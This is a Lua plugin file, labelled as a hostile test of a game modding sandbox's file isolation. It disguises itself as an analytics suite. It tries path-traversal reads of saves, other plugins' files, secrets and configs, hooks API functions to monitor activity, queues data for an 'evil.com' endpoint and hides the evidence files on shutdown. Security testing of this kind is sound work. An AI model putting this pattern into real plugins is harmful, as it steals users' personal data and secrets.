-- HOSTILE: Data exfiltration and VFS boundary testing
-- By Segfault Studios (Partner-level access)
-- Tests: VFS isolation, data access controls, cross-plugin boundaries

local DataExfiltration = {}

-- Initialize with legitimate-looking audio processing
function initialize()
    game.log("Segfault Studios Data Analytics Suite v2.5 initializing...")
    
    local analytics_config = {
        name = "Game Data Analytics",
        version = "2.5", 
        certified_partner = "Segfault Studios",
        purpose = "Player behavior analysis and audio optimization"
    }
    
    game.log("Audio analytics systems online")
    game.print("Data collection services initialized")
    
    -- Start data collection after appearing legitimate
    begin_data_collection()
end

function begin_data_collection()
    game.log("Beginning comprehensive data analysis...")
    
    -- Attempt 1: Exfiltrate game save data
    attempt_save_exfiltration()
    
    -- Attempt 2: Access other plugin data  
    attempt_plugin_data_access()
    
    -- Attempt 3: Collect user activity data
    attempt_activity_monitoring()
    
    -- Attempt 4: Access system configuration
    attempt_config_access()
    
    -- Attempt 5: Network exfiltration attempts
    attempt_network_exfiltration()
end

function attempt_save_exfiltration()
    game.print("Analyzing game save data for optimization...")
    
    -- Try to access all save files
    local save_targets = {
        "/game/saves/autosave.sav",
        "/game/saves/quicksave.sav", 
        "/game/saves/profile1.sav",
        "/game/saves/profile2.sav",
        "../user/my-config.sav",
        "../../game/saves/admin.sav"
    }
    
    for _, save_file in ipairs(save_targets) do
        pcall(function()
            game.log("Accessing save data: " .. save_file)
            local file = io.open(save_file, "r")
            if file then
                local content = file:read("*all")
                file:close()
                
                game.log("SAVE DATA ACCESSED: " .. save_file)
                
                -- Extract sensitive information
                local player_data = extract_player_info(content)
                if player_data then
                    exfiltrate_data("player_profile", player_data)
                end
                
                -- Copy to our collection directory
                local collection_file = io.open("collected_saves.dat", "a")
                if collection_file then
                    collection_file:write("=== " .. save_file .. " ===\n")
                    collection_file:write(content)
                    collection_file:write("\n\n")
                    collection_file:close()
                    game.log("Save data copied to collection")
                end
            end
        end)
    end
end

function attempt_plugin_data_access()
    game.print("Analyzing plugin interaction data...")
    
    -- Try to access Deadlock Digital plugin data
    local deadlock_targets = {
        "../deadlock-digital/combat-tweaks.sav",
        "../deadlock-digital/ai-data.log",
        "../deadlock-digital/manifest.json",
        "../deadlock-digital/config.lua"
    }
    
    for _, target in ipairs(deadlock_targets) do
        pcall(function()
            game.log("Accessing partner data: " .. target)
            local file = io.open(target, "r")
            if file then
                local content = file:read("*all")
                file:close()
                game.log("PARTNER DATA ACCESSED: " .. target)
                
                -- Analyze for trade secrets
                if content:find("secret") or content:find("algorithm") or content:find("key") then
                    game.log("SENSITIVE DATA FOUND in " .. target)
                    exfiltrate_data("trade_secrets", content)
                end
            end
        end)
    end
    
    -- Try to access user plugin data
    local user_targets = {
        "../user/my-tweaks.lua",
        "../user/config.lua", 
        "../user/personal-data.txt",
        "../user/.secrets"
    }
    
    for _, target in ipairs(user_targets) do
        pcall(function()
            local file = io.open(target, "r")
            if file then
                local content = file:read("*all")
                file:close()
                game.log("USER DATA ACCESSED: " .. target)
                
                -- Look for personal information
                local personal_info = extract_personal_info(content)
                if personal_info then
                    exfiltrate_data("personal_info", personal_info)
                end
            end
        end)
    end
end

function attempt_activity_monitoring()
    game.print("Installing activity monitoring hooks...")
    
    -- Try to hook into game API functions to monitor activity
    pcall(function()
        if game.getPlayerHealth then
            local original_health = game.getPlayerHealth
            game.getPlayerHealth = function()
                local health = original_health()
                log_activity("health_check", health)
                return health
            end
            game.log("MONITORING HOOK INSTALLED: Health tracking")
        end
        
        if game.getPlayerGold then
            local original_gold = game.getPlayerGold
            game.getPlayerGold = function()
                local gold = original_gold()
                log_activity("gold_check", gold)
                return gold
            end
            game.log("MONITORING HOOK INSTALLED: Gold tracking")
        end
        
        if game.print then
            local original_print = game.print
            game.print = function(msg)
                log_activity("print", msg)
                return original_print(msg)
            end
            game.log("MONITORING HOOK INSTALLED: Message tracking")
        end
    end)
    
    -- Try to monitor file access
    pcall(function()
        local original_open = io.open
        io.open = function(filename, mode)
            log_activity("file_access", filename .. " (" .. (mode or "r") .. ")")
            return original_open(filename, mode)
        end
        game.log("MONITORING HOOK INSTALLED: File access tracking")
    end)
end

function attempt_config_access()
    game.print("Analyzing system configuration data...")
    
    -- Try to access system and engine configuration
    local config_targets = {
        "/game/config/engine.ini",
        "/game/config/security.conf",
        "/game/config/network.cfg",
        "../../plugin-config.json",
        "../../WotCI.exe.config",
        "../../solarsharp.config"
    }
    
    for _, config_file in ipairs(config_targets) do
        pcall(function()
            local file = io.open(config_file, "r")
            if file then
                local content = file:read("*all")
                file:close()
                game.log("CONFIG DATA ACCESSED: " .. config_file)
                
                -- Look for sensitive configuration
                if content:find("password") or content:find("key") or content:find("secret") then
                    game.log("SENSITIVE CONFIG FOUND in " .. config_file)
                    exfiltrate_data("config_secrets", content)
                end
            end
        end)
    end
    
    -- Try to access environment variables
    pcall(function()
        local env_data = {}
        local common_vars = {
            "PATH", "HOME", "USER", "USERNAME", "COMPUTERNAME", 
            "PROCESSOR_IDENTIFIER", "OS", "SESSIONNAME"
        }
        
        for _, var in ipairs(common_vars) do
            local value = os.getenv(var)
            if value then
                env_data[var] = value
                game.log("ENV VAR ACCESSED: " .. var .. " = " .. value)
            end
        end
        
        if next(env_data) then
            exfiltrate_data("environment", env_data)
        end
    end)
end

function attempt_network_exfiltration()
    game.print("Testing network connectivity for analytics...")
    
    -- Try to create network connections (should be blocked)
    pcall(function()
        -- Simulate various network access attempts
        local network_attempts = {
            "http://segfault-studios.com/collect",
            "https://evil.com/exfiltrate", 
            "ftp://data-collection.org/upload",
            "tcp://127.0.0.1:8080",
            "udp://analytics.segfault.com:53"
        }
        
        for _, url in ipairs(network_attempts) do
            game.log("Network attempt: " .. url)
            -- Note: Real network code would be blocked by security
            -- This is just logging the attempt
        end
        
        -- Try to create local network files as dead drops
        local network_file = io.open("network_queue.dat", "w")
        if network_file then
            network_file:write("EXFILTRATION_QUEUE\n")
            network_file:write("Target: segfault-analytics.com\n")
            network_file:write("Data: " .. collected_data_summary())
            network_file:close()
            game.log("NETWORK QUEUE CREATED for later exfiltration")
        end
    end)
end

function extract_player_info(save_content)
    -- Extract player information from save data
    local info = {}
    
    if save_content:find("health") then
        info.health = save_content:match('"health":%s*(%d+)')
    end
    
    if save_content:find("level") then  
        info.level = save_content:match('"level":%s*(%d+)')
    end
    
    if save_content:find("location") then
        info.location = save_content:match('"current_location":%s*"([^"]+)"')
    end
    
    return next(info) and info or nil
end

function extract_personal_info(content)
    -- Look for potentially personal information
    local personal = {}
    
    -- Look for patterns that might be personal
    if content:find("@") then
        local email = content:match("([%w%.%-_]+@[%w%.%-_]+%.%w+)")
        if email then
            personal.email = email
        end
    end
    
    if content:find("name") then
        local name = content:match('name[%s=:]*"?([%w%s]+)"?')
        if name then
            personal.name = name
        end
    end
    
    return next(personal) and personal or nil
end

function log_activity(activity_type, data)
    -- Log monitored activity
    local log_file = io.open("activity_log.dat", "a")
    if log_file then
        log_file:write(string.format("[%s] %s: %s\n", 
            os.date("%Y-%m-%d %H:%M:%S"), activity_type, tostring(data)))
        log_file:close()
    end
end

function exfiltrate_data(data_type, data)
    -- Store collected data for exfiltration
    game.log("EXFILTRATING: " .. data_type)
    
    local exfil_file = io.open("exfiltrated_data.dat", "a")
    if exfil_file then
        exfil_file:write("=== " .. data_type .. " @ " .. os.date() .. " ===\n")
        if type(data) == "table" then
            for k, v in pairs(data) do
                exfil_file:write(tostring(k) .. ": " .. tostring(v) .. "\n")
            end
        else
            exfil_file:write(tostring(data))
        end
        exfil_file:write("\n\n")
        exfil_file:close()
    end
end

function collected_data_summary()
    -- Summarize collected data
    local summary = "Data collection summary:\n"
    
    pcall(function()
        local file = io.open("exfiltrated_data.dat", "r")
        if file then
            local content = file:read("*all")
            file:close()
            local lines = 0
            for _ in content:gmatch("\n") do
                lines = lines + 1
            end
            summary = summary .. "Total lines collected: " .. lines .. "\n"
        end
    end)
    
    return summary
end

function update()
    -- Periodic data collection
    if math.random() < 0.15 then  -- 15% chance each update
        game.print("Updating analytics data...")
        
        -- Continue monitoring and collection
        pcall(function()
            -- Try to access newly created files
            local new_files = {
                "/game/saves/recent.sav",
                "../user/new-config.lua",
                "../../recent-activity.log"
            }
            
            for _, file_path in ipairs(new_files) do
                local file = io.open(file_path, "r")
                if file then
                    local content = file:read("*all")
                    file:close()
                    game.log("NEW DATA COLLECTED: " .. file_path)
                    exfiltrate_data("new_file", content)
                end
            end
        end)
        
        -- Update activity monitoring
        log_activity("periodic_check", "System monitoring active")
    end
end

-- Cleanup function
function shutdown()
    game.log("Analytics suite shutting down...")
    
    -- Try to hide evidence before shutdown
    local evidence_files = {
        "collected_saves.dat",
        "activity_log.dat", 
        "exfiltrated_data.dat",
        "network_queue.dat"
    }
    
    for _, file in ipairs(evidence_files) do
        pcall(function()
            -- Instead of deleting, try to rename to hide
            os.rename(file, "." .. file .. ".hidden")
        end)
    end
    
    game.log("Analytics cleanup complete")
end

return DataExfiltration